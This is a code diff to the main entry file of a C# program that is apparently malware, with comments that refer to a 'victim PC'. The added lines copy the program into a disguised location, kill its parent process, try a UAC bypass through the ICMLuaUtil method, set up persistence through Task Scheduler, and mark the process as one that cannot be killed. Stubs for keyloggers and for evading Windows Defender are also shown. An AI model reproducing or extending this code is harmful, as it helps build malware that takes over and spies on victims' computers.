@@ -1,8 +1,11 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Client
 {
@@ -13,17 +16,47 @@ namespace Client
         /// </summary>
         static void Main(string[] args)
         {
+            ArgsParser(args);
+
             /// Check if Application is already on victim PC.
+            if (!Constants.IsInVictimPC()) Migrate();
 
-            /// Attempts to bypass UAC.
-            //  If already in victim PC continue.
-            //  If not in victim PC copy self to AppData Microsoft folder.
+            /// Attempt to be God.
+            if (!Utilities.Environment.IsAdmin())
+                Armitage.UAC.UACBypass.QuickStart(Armitage.UAC.UACMethods.ICMLuaUtil);
+            else {
+                Armitage.Startup.ViaTaskScheduler();
+                LoveCannotBeKilled();
+            }
 
-            /// Add current application to firewall rule.
-            
-            /// Bypass Windows defender.
-            
             /// Start loggers.
+
+            while (true) {
+                // Sleep
+                Thread.Sleep(10000);
+            }
+        }
+
+        public static void ArgsParser(string[] args) {
+            try {
+                if (args.Length > 0) {
+                    Process.GetProcessById(int.Parse(args[0].Trim())).Kill();
+                }
+            }
+            catch { }
+        }
+
+        /// <summary>
+        /// Turn into a system process.
+        /// </summary>
+        public static void LoveCannotBeKilled() {
+            Armitage.My_Love.Protect();
+        }
+
+        public static void Migrate() {
+            if (Armitage.Copy.CopySelfTo(Constants.MMCFile))
+                Process.Start(Constants.MMCFile, Constants.MyProcessID.ToString());
+            Environment.Exit(2);
         }
     }
 }
